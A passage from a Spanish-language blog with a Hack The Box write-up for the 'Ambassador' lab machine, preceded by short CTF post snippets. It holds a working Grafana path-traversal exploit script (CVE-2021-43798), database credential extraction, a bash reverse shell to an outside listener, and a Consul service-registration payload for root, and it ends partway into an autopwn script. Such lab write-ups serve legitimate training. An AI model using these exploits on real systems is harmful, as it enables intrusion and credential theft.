Day 15 -&amp;gt; ❌ Day 16 -&amp;gt; ❌ Day 17 -&amp;gt; ❌ Day 18 -&amp;gt; ❌ Day 19 -&amp;gt; ❌ Day 20 -&amp;gt; ❌ Day 21 -&amp;gt; ❌ Day 22 -&amp;gt; ❌ Day 23 -&amp;gt; ❌ Day 24 -&amp;gt; ❌ Day 25 -&amp;gt; ❌You can also try: https://adventofcode.com/2022I hope to go further next year!" }, { "title": "Advent of Cyber 2022", "url": "/posts/AoC_2022/", "categories": "THM", "tags": "THM, Advent of cyber", "date": "2022-12-28 18:55:21 -0500", "snippet": "Cyber Security in 24 days!24 days of challenges on cybersecurity issues where each stage of a real attack process is studied. The following topics are covered: Frameworks 🔵 Log Analysis 🔵 OSINT 🔴 Scanning 🔴 Brute-Forcing 🔴 Email Analysis 🔵 Cyber Chef 🔵 Smart Contracts 🔴 Pivoting 🔴 Hack a game 🔴 Memory Forensics 🔵 Malware Analysis 🔵 Packet Analysis 🔵 Web Applications 🔴 Secure Coding 🟣 Secure Coding 🟣 Secure Coding 🟣 Sigma 🔵 Hardware Hacking 🔴 Firmware 🔴 MQTT 🔴 Attack Surface Reduction 🔵 Defence in Depth 🟣Certificate of completion:" }, { "title": "NahamCon CTF 2022", "url": "/posts/NahamCon_2022/", "categories": "CTF", "tags": "CTF, Nahamcon", "date": "2022-12-19 13:40:20 -0500", "snippet": "First CTF!Classic CTF in grous with various topics such as: Warmup, Web, Pwn, Rev, Crypto, Mobile, DevOps, Cloud, Misc, Hardware, Networking, Scripting, and Web3. As a first experience we learned many things and with everything for the next one. Thanks to those who joined!" }, { "title": "Hackthebox Writeup Ambassador", "url": "/posts/HTBAmbassador/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Medium, cve-2021-43798, Directory Path Traversal, Leakage Information, Git, MySQL, SQLite, Python Scripting", "date": "2022-11-23 15:45:18 -0500", "snippet": "Overview Directory Path Traversal by grafana plugin url (CVE-2021-43798) SQLite and MySQL Database enumeration (Foothold) Remote Code Execution by Consul Service Registration (Privilege Escalation) OS IP Release Date Difficulty Points Linux 10.10.11.183 01 Oct 2022 Medium 30 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.183PING 10.10.11.183 (10.10.11.183) 56(84) bytes of data.64 bytes from 10.10.11.183: icmp_seq=1 ttl=63 time=106 ms \\______________________ Linux Machine--- 10.10.11.183 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 105.547/105.547/105.547/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationEmpezamos con la fase de reconocimiento haciendo un escaneo de tipo TCP (Transfer Control Protocol) para descubrir los puertos abiertos de la máquina:❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.183Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 15:48 -05Nmap scan report for 10.10.11.183Host is up (0.11s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh \\_________________ Secure Shell Protocol80/tcp open http \\_________________ Hypertext Transfer Protocol3000/tcp open ppp \\_________________ Point-to-Point Protocol3306/tcp open mysql \\_________________ MySQL database Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 –open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoAhora escaneamos más a fondo para enumerar que servicios corren por detrás de los puertos 21(FTP) - 22(SSH) - 80(HTTP):❯ nmap -p22,80,3000,3306 -sCV -oN open_ports_TCP 10.10.11.183Nmap scan report for ambassador.htb (10.10.11.183)Host is up (0.11s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 29dd8ed7171e8e3090873cc651007c75 (RSA)| 256 80a4c52e9ab1ecda276439a408973bef (ECDSA)|_ 256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Ambassador Development Server|_http-generator: Hugo 0.94.23000/tcp open ppp?| fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 302 Found| Cache-Control: no-cache| Content-Type: text/html; charset=utf-8| Expires: -1| Location: /login| Pragma: no-cache| Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax| X-Content-Type-Options: nosniff| X-Frame-Options: deny| X-Xss-Protection: 1; mode=block| Date: Wed, 23 Nov 2022 20:56:51 GMT| Content-Length: 29| href=&quot;/login&quot;&amp;gt;Found&amp;lt;/a&amp;gt;.| GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 302 Found| Cache-Control: no-cache| Content-Type: text/html; charset=utf-8| Expires: -1| Location: /login| Pragma: no-cache| Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax| X-Content-Type-Options: nosniff| X-Frame-Options: deny| X-Xss-Protection: 1; mode=block| Date: Wed, 23 Nov 2022 20:56:18 GMT| Content-Length: 29| href=&quot;/login&quot;&amp;gt;Found&amp;lt;/a&amp;gt;.| HTTPOptions: | HTTP/1.0 302 Found| Cache-Control: no-cache| Expires: -1| Location: /login| Pragma: no-cache| Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax| X-Content-Type-Options: nosniff| X-Frame-Options: deny| X-Xss-Protection: 1; mode=block| Date: Wed, 23 Nov 2022 20:56:24 GMT|_ Content-Length: 03306/tcp open mysql MySQL 8.0.30-0ubuntu0.20.04.2| mysql-info: | Protocol: 10| Version: 8.0.30-0ubuntu0.20.04.2| Thread ID: 61| Capabilities flags: 65535| Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, FoundRows, IgnoreSigpipes, LongColumnFlag, SwitchToSSLAfterHandshake, ODBCClient, LongPassword, ConnectWithDatabase, SupportsLoadDataLocal, Speaks41ProtocolNew, SupportsCompression, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins| Status: Autocommit| Salt: d. \\x1Al\\x0D\\x08@c\\x08\\x03.F5e\\x13m\\x10\\2|_ Auth Plugin Name: caching_sha2_password1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3000-TCP:V=7.93%I=7%D=11/23%Time=637E88F0%P=x86_64-pc-linux-gnu%r(G...SF:T\\r\\nContent-Length:\\x2029\\r\\n\\r\\n&amp;lt;a\\x20href=\\&quot;/login\\&quot;&amp;gt;Found&amp;lt;/a&amp;gt;\\.\\n\\nSF:&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sCV (Fusión de parámetros -sC -sV) -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapOmitimos el escaneo al puerto 22(SSH) y 3306(MySQL) ya que no tenemos ninguna credencial válida y la versión del servicio no es vulnerable. Por otro lado, tenemos los servicios web en los puertos 80(HTTP) y 3000(PPP): Enumeración del puerto 80Debido a un Leakage Information conseguimos un posible usuario para conectarnos por SSH Enumeración del puerto 3000Del escaneo anterior con nmap no conseguimos información sobre las tecnologías del servicio, por ello usamos whatweb para enumerarlas:❯ whatweb 10.10.11.183:3000http://10.10.11.183:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[10.10.11.183], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]http://10.10.11.183:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.2.0], HTML5, IP[10.10.11.183], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]FootholdObservamos que existe una redirección a un panel de login, pero mas importante, vemos una tecnología llamada Grafana[8.2.0]. Así que de manera general usamos searchsploit (herramienta de la linea de comandos para buscar diferentes exploits de su base de datos Exploit DB):❯ searchsploit Grafana---------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------- ---------------------------------Grafana 7.0.1 - Denial of Service (PoC) | linux/dos/48638.shGrafana 8.3.0 - Directory Traversal and Arbitrary File Read | multiple/webapps/50581.py---------------------------------------------------------------------- ---------------------------------Encontramos que una version posterior es vulnerable a un Path Traversal, para asegurarnos buscamos en internet vulnerabilidades con la respectiva versión: CVE-2021-43798Como validamos que es vulnerable, basandonos en el script original tenemos el siguiente exploit:&quot;&quot;&quot;CVE-2021-43798--------------Description: Vulnerable path traversal in Grafana for version v8.0.0-beta1 to v8.3.0&quot;&quot;&quot;import argparseimport signalimport sysfrom random import choicefrom requests import Session, Request# Ctrl + c# (function)def signal_handler(signum, frame): sys.exit(&#39;\\n[!] User terminated.&#39;)# (signal)signal.signal(signal.SIGINT, signal_handler)## Default plugins Grafana (https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/)plugins = [ &quot;alertlist&quot;, &quot;annolist&quot;, &quot;barchart&quot;, &quot;bargauge&quot;, &quot;candlestick&quot;, &quot;cloudwatch&quot;, &quot;dashlist&quot;, &quot;elasticsearch&quot;, &quot;gauge&quot;, &quot;geomap&quot;, &quot;gettingstarted&quot;, &quot;grafana-azure-monitor-datasource&quot;, &quot;graph&quot;, &quot;heatmap&quot;, &quot;histogram&quot;, &quot;influxdb&quot;, &quot;jaeger&quot;, &quot;logs&quot;, &quot;loki&quot;, &quot;mssql&quot;, &quot;mysql&quot;, &quot;news&quot;, &quot;nodeGraph&quot;, &quot;opentsdb&quot;, &quot;piechart&quot;, &quot;pluginlist&quot;, &quot;postgres&quot;, &quot;prometheus&quot;, &quot;stackdriver&quot;, &quot;stat&quot;, &quot;state-timeline&quot;, &quot;status-history&quot;, &quot;table&quot;, &quot;table-old&quot;, &quot;tempo&quot;, &quot;testdata&quot;, &quot;text&quot;, &quot;timeseries&quot;, &quot;welcome&quot;, &quot;zipkin&quot;]## Functions# make request to grafanadef make_request(args): try: with Session() as session: vulnerable_path = args.target + &#39;/public/plugins/&#39; + choice(plugins) + &#39;/..&#39;*10 + args.file request = Request(&#39;GET&#39;, vulnerable_path) prepare_req = session.prepare_request(request) prepare_req.url = vulnerable_path response = session.send(prepare_req) if &#39;Plugin not found&#39; in response.text: sys.exit(&#39;\\n[!] File not found&#39;) else: if response.status_code == 200: print(&#39;\\n{}\\n&#39;.format(response.text)) except Exception as error: sys.exit(&#39;\\n[X] Error: %s&#39; % error)## Main flowif __name__ == &#39;__main__&#39;: parser = argparse.ArgumentParser( description=&quot;Vulnerable path traversal in Grafana for version v8.0.0-beta1 to v8.3.0&quot;, formatter_class=argparse.RawDescriptionHelpFormatter, epilog=&quot;&quot;&quot;Example: CVE-2021-43798.py -t http://10.10.11.183:3000 -f /etc/passwd &quot;&quot;&quot;) parser.add_argument(&#39;-t&#39;, &#39;--target&#39;, required=True, help=&#39;Grafana host&#39;) parser.add_argument(&#39;-f&#39;, &#39;--file&#39;, required=True, help=&#39;File name to read&#39;) args = parser.parse_args() make_request(args)Ahora intentamos leer el archivo /etc/passwd y lo conseguimos:❯ python3 CVE-2021-43798.py -t &#39;http://10.10.11.183:3000&#39; -f &#39;/etc/passwd&#39;root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falseusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:112:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologindeveloper:x:1000:1000:developer:/home/developer:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsegrafana:x:113:118::/usr/share/grafana:/bin/falsemysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/falseconsul:x:997:997::/home/consul:/bin/false Aquí tienes un articulo que estudia a detalle la vulnerabilidad anterior: https://j0vsec.com/post/cve-2021-43798/Ya que podemos leer archivos, nuestro siguiente paso es buscar archivos interesantes sobre cualquier aplicación del sistema. Y ya que nuestro objetivo fue Grafana, ahora podemos buscar archivos de configuración que contengan datos importantes: Grafana ConfigurationObtenemos la ruta del archivo de configuración y lo logramos extraer:##################### Grafana Configuration Example ####################### Everything has defaults so you only need to uncomment things you want to# change# possible values : production, development;app_mode = production# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty;instance_name = ${HOSTNAME}...Examinando el archivo encontramos en la sección de Paths lo siguiente:...#################################### Paths ####################################[paths]# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used);data = /var/lib/grafana...Una ruta donde se almacenan archivos interesantes, solo nos faltaria un nombre, el cúal encontramos en la sección Database:...#################################### Database ####################################[database]...# For &quot;sqlite3&quot; only, path relative to data_path setting;path = grafana.db...Lo tenemos, ahora intentamos descargar el archivo /var/lib/grafana/grafana.db: Usando curl❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/mysql/../../../../../../../../var/lib/grafana/grafana.db -O % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 644k 100 644k 0 0 807k 0 --:--:-- --:--:-- --:--:-- 807k❯ file grafana.dbgrafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 558, database pages 161, cookie 0x119, schema 4, UTF-8, version-valid-for 558Ahora usamos el comando sqlite3 para enumerar la base de datos grafana.db: List tables❯ sqlite3 grafana.dbSQLite version 3.39.4 2022-09-29 15:55:41Enter &quot;.help&quot; for usage hints.sqlite&amp;gt; .tablesalert login_attempt alert_configuration migration_log alert_instance ngalert_configuration alert_notification org alert_notification_state org_user alert_rule playlist alert_rule_tag playlist_item alert_rule_version plugin_setting annotation preferences annotation_tag quota api_key server_lock cache_data session dashboard short_url dashboard_acl star dashboard_provisioning tag dashboard_snapshot team dashboard_tag team_member dashboard_version temp_user data_source test_data kv_store user library_element user_auth library_element_connection user_auth_token Enumerate table schemasqlite&amp;gt; .schema data_source CREATE TABLE `data_source` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `org_id` INTEGER NOT NULL, `version` INTEGER NOT NULL, `type` TEXT NOT NULL, `name` TEXT NOT NULL, `access` TEXT NOT NULL, `url` TEXT NOT NULL, `password` TEXT NULL, `user` TEXT NULL, `database` TEXT NULL, `basic_auth` INTEGER NOT NULL, `basic_auth_user` TEXT NULL, `basic_auth_password` TEXT NULL, `is_default` INTEGER NOT NULL, `json_data` TEXT NULL, `created` DATETIME NOT NULL, `updated` DATETIME NOT NULL, `with_credentials` INTEGER NOT NULL DEFAULT 0, `secure_json_data` TEXT NULL, `read_only` INTEGER NULL, `uid` TEXT NOT NULL DEFAULT 0);CREATE INDEX `IDX_data_source_org_id` ON `data_source` (`org_id`);CREATE UNIQUE INDEX `UQE_data_source_org_id_name` ON `data_source` (`org_id`,`name`);CREATE UNIQUE INDEX `UQE_data_source_org_id_uid` ON `data_source` (`org_id`,`uid`);CREATE INDEX `IDX_data_source_org_id_is_default` ON `data_source` (`org_id`,`is_default`); DataSource is a name given to the connection set up to a database from a server Extract database credentialssqlite&amp;gt; .mode columnsqlite&amp;gt; .header onsqlite&amp;gt; SELECT user, password, database FROM data_source;user password database------- -------------------------- --------grafana dontStandSoCloseToMe63221! grafana Aquí puedes encontrar algunos comandos básicos de SQLite: https://www.sqlitetutorial.net/sqlite-commands/Con estas credenciales nos conectamos a la base de datos que enumeramos anteriormente con nmap, y extraemos las credenciales del usuario developer:❯ mysql -h &#39;10.10.11.183&#39; -u &#39;grafana&#39; -p grafanaEnter password: Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MySQL connection id is 66Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MySQL [grafana]&amp;gt; show schemas; +--------------------+| Database |+--------------------+ | grafana | | information_schema | | mysql | | performance_schema | | sys | | whackywidget | +--------------------+6 rows in set (0.112 sec) MySQL [grafana]&amp;gt; use whackywidget; Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -A Database changed MySQL [whackywidget]&amp;gt; show tables;+------------------------+ | Tables_in_whackywidget | +------------------------+ | users | +------------------------+ 1 row in set (0.105 sec) MySQL [whackywidget]&amp;gt; SELECT * FROM users; +-----------+------------------------------------------+| user | pass | +-----------+------------------------------------------+ | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |+-----------+------------------------------------------+MySQL [whackywidget]&amp;gt; SELECT user, FROM_BASE64(pass) FROM users\\G*************************** 1. row *************************** user: developerFROM_BASE64(pass): anEnglishManInNewYork027468Ahora recordamos el mensaje de antes sobre que podemos conectarnos por SSH como el usuario developer y conseguimos entrar al sistema:❯ ssh developer@10.10.11.183The authenticity of host &#39;10.10.11.183 (10.10.11.183)&#39; can&#39;t be established.ED25519 key fingerprint is SHA256:zXkkXkOCX9Wg6pcH1yaG4zCZd5J25Co9TrlNWyChdZk.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;10.10.11.183&#39; (ED25519) to the list of known hosts.developer@10.10.11.183&#39;s password: Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed 23 Nov 2022 11:02:22 PM UTC System load: 0.02 Processes: 229 Usage of /: 81.5% of 5.07GB Users logged in: 0 Memory usage: 55% IPv4 address for eth0: 10.10.11.183 Swap usage: 0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Wed Nov 23 20:53:34 2022 from 10.10.14.6developer@ambassador:~$ find / -name user.txt -exec ls -l {} + 2&amp;gt;/dev/null-rw-r----- 1 root developer 33 Nov 23 17:05 /home/developer/user.txtPrivilege EscalationDespués de una enumeración básica del sistema encontramos varios puertos abiertos de manera local:developer@ambassador:~$ netstat -tulnp(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:8600 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8300 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8301 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8302 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8500 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::3000 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - udp 0 0 0.0.0.0:68 0.0.0.0:* - udp 0 0 127.0.0.1:8301 0.0.0.0:* - udp 0 0 127.0.0.1:8302 0.0.0.0:* - udp 0 0 127.0.0.1:8600 0.0.0.0:* -Usamos un poco de scripting en bash para comunicarnos con cada puerto:developer@ambassador:~$ for i in $(netstat -tulnp | grep 127.0.0.1 | awk &#39;{print $4}&#39; | awk -F&#39;:&#39; &#39;{print $2}&#39;); do echo -e &quot;$i:\\n&quot;; curl http://localhost:$i; done(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)8600:curl: (52) Empty reply from server33060:curl: (1) Received HTTP/0.9 when not allowed8300:curl: (56) Recv failure: Connection reset by peer8301:curl: (52) Empty reply from server8302:curl: (52) Empty reply from server8500:Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart.8301:curl: (52) Empty reply from server8302:curl: (52) Empty reply from server8600:curl: (52) Empty reply from serverSolo conseguimos respuesta del puerto 8500 y menciona algo de Consul, buscando en internet encontramos lo siguiente: Consul serviceYa que sabemos que Consul corre por detrás y no es la versión mas reciente, para informarnos más buscamos información en su Documentación: Register Service with Consul APIObservamos que en la sección Args podemos ejecutar un archivo en intervalos de tiempo especificados. Pero que es ese archivo en .json?: Service ConfigurationAhora creamos nuestros archivos: reverse.sh#!/bin/bash/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.155/1234 0&amp;gt;&amp;amp;1 payload.json{ &quot;ID&quot;: &quot;marss_service&quot;, &quot;Name&quot;: &quot;rce&quot;, &quot;Tags&quot;: [&quot;primary&quot;, &quot;v1&quot;], &quot;Address&quot;: &quot;127.0.0.1&quot;, &quot;Port&quot;: 80, &quot;Check&quot;: { &quot;DeregisterCriticalServiceAfter&quot;: &quot;90m&quot;, &quot;Args&quot;: [&quot;/tmp/.10.10.14.155/reverse.sh&quot;], &quot;Interval&quot;: &quot;10s&quot;, &quot;Timeout&quot;: &quot;86400s&quot; }}Ejecutamos el comando para subir nuestro servicio y nos aparece lo siguiente:developer@ambassador:/tmp/.10.10.14.155$ curl -X PUT --data @payload.json \\ http://localhost:8500/v1/agent/service/register?replace-existing-checks=truePermission denied: token with AccessorID &#39;00000000-0000-0000-0000-000000000002&#39; lacks permission &#39;service:write&#39; on &quot;redis&quot;Explorando más la documentación tenemos lo siguiente: Consul AuthenticationEntonces lo que nos falta es el token para poder realizar peticiones y así ejecutar nuestro servicio. Por ello, enumerando el sistema encontramos un repositorio git en el directorio my-app y revisando los cambios del último log encontramos el token:developer@ambassador:/opt/my-app$ ls -latotal 24drwxrwxr-x 5 root root 4096 Mar 13 2022 .drwxr-xr-x 4 root root 4096 Sep 1 22:13 ..drwxrwxr-x 4 root root 4096 Mar 13 2022 envdrwxrwxr-x 8 root root 4096 Mar 14 2022 .git-rw-rw-r-- 1 root root 1838 Mar 13 2022 .gitignoredrwxrwxr-x 3 root root 4096 Mar 13 2022 whackywidgetdeveloper@ambassador:/opt/my-app$ git showcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&amp;gt; main)Author: Developer &amp;lt;developer@ambassador.local&amp;gt;Date: Sun Mar 13 23:47:36 2022 +0000 tidy config scriptdiff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.shindex 35c08f6..fc51ec0 100755--- a/whackywidget/put-config-in-consul.sh+++ b/whackywidget/put-config-in-consul.sh@@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app-# Export MYSQL_PASSWORD before running+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORDAhora ejecutamos nuestro servicio, esperemos el intervalo establecido y se ejecutara nuestra Shell inversa:developer@ambassador:/tmp/.10.10.14.155$ curl -X PUT --data @payload.json \\ -H &#39;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&#39; \\ http://localhost:8500/v1/agent/service/register?replace-existing-checks=truedeveloper@ambassador:/tmp/.10.10.14.155$ chmod +x reverse.sh developer@ambassador:/tmp/.10.10.14.155$ ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────❯ nc -lvnp 1234Ncat: Version 7.93 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234Ncat: Connection from 10.10.11.183.Ncat: Connection from 10.10.11.183:35370.bash: cannot set terminal process group (29649): Inappropriate ioctl for devicebash: no job control in this shellroot@ambassador:/# whoamiwhoamirootroot@ambassador:/# find / -name root.txt -exec ls -l {} \\;find / -name root.txt -exec ls -l {} \\;-rw-r----- 1 root root 33 Nov 23 17:05 /root/root.txtLuego de esto es importante desactivar el servicio, lo hacemos con el siguiente comando:developer@ambassador:/tmp/.10.10.14.155$ curl -X PUT -H &#39;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&#39; \\ http://localhost:8500/v1/agent/service/deregister/marss_serviceAutopwnPara seguir mejorando el scripting hice un autopwn en python para automatizar todo el proceso:#!/usr/bin/env python3&quot;&quot;&quot;Autopwn Assambador HTB----------------------Author: MarssDate: 21 Nov, 2022&quot;&quot;&quot;import argparseimport sqlite3from base64 import b64decodefrom json import dumpsfrom mysql import connectorfrom paramiko import AutoAddPolicy, SSHClientfrom pwn import *from random import choicefrom re import findallfrom requests import Request, Sessionfrom signal import signal, SIGINTfrom sys import exit## Ctrl + c# (function)def signal_handler(signum, frame): exit(&#39;\\n[!] User terminated.&#39;)# (signal)signal(SIGINT, signal_handler)## Global variables# grafana pluginsplugins = [ &quot;alertlist&quot;, &quot;annolist&quot;, &quot;barchart&quot;, &quot;bargauge&quot;, &quot;candlestick&quot;, &quot;cloudwatch&quot;, &quot;dashlist&quot;, &quot;elasticsearch&quot;, &quot;gauge&quot;, &quot;geomap&quot;, &quot;gettingstarted&quot;, &quot;grafana-azure-monitor-datasource&quot;, &quot;graph&quot;, &quot;heatmap&quot;, &quot;histogram&quot;, &quot;influxdb&quot;, &quot;jaeger&quot;, &quot;logs&quot;, &quot;loki&quot;, &quot;mssql&quot;, &quot;mysql&quot;, &quot;news&quot;, &quot;nodeGraph&quot;, &quot;opentsdb&quot;, &quot;piechart&quot;, &quot;pluginlist&quot;, &quot;postgres&quot;, &quot;prometheus&quot;, &quot;stackdriver&quot;, &quot;stat&quot;, &quot;state-timeline&quot;, &quot;status-history&quot;, &quot;table&quot;, &quot;table-old&quot;, &quot;tempo&quot;, &quot;testdata&quot;, &quot;text&quot;, &quot;timeseries&quot;, &quot;welcome&quot;, &quot;zipkin&quot;]## Main classclass Exploit: def __init__(self, args): self.args = args self.target_host = { &#39;ip_address&#39; : &#39;10.10.11.183&#39;, &#39;grafana_service&#39; : &#39;http://10.10.11.183:3000&#39; } self.target_files = { &#39;grafana_conf&#39; : &#39;/etc/grafana/grafana.ini&#39;, &#39;grafana_db&#39; : None } self.target_credentials = { &#39;mysql&#39; : { &#39;user&#39; : None, &#39;pass&#39; : None }, &#39;ssh&#39; : { &#39;user&#39; : None, &#39;pass&#39; : None }, &#39;consul&#39; : { &#39;token&#39; : None } } self.json_file = &#39;payload.json&#39; self.shell_file = &#39;shell.sh&#39; def run(self): &quot;&quot;&quot; Exploit process: ---------------- (1) Grafana plugin url [CVE-2021-43798] (Directory Path Traversal) * Database path into Grafana config file (2) SQLite enumeration in Grafana database file * Mysql credentials (3) Mysql enumeration * SSH credentials (4) Vulnerable path in Consul service registration (Remote Code Execution) * [Requirements] - Consul token (Leakage Information in git repository) &quot;&quot;&quot; with log.progress(&#39;Starting Attack&#39;) as progress: progress.status(&#39;Grafana plugin url [CVE-2021-43798] (Directory Path Traversal)&#39;); time.sleep(3) self.extract_file(file=self.target_files[&#39;grafana_conf&#39;]) progress.status(&#39;Searching grafana.db path in config file&#39;); 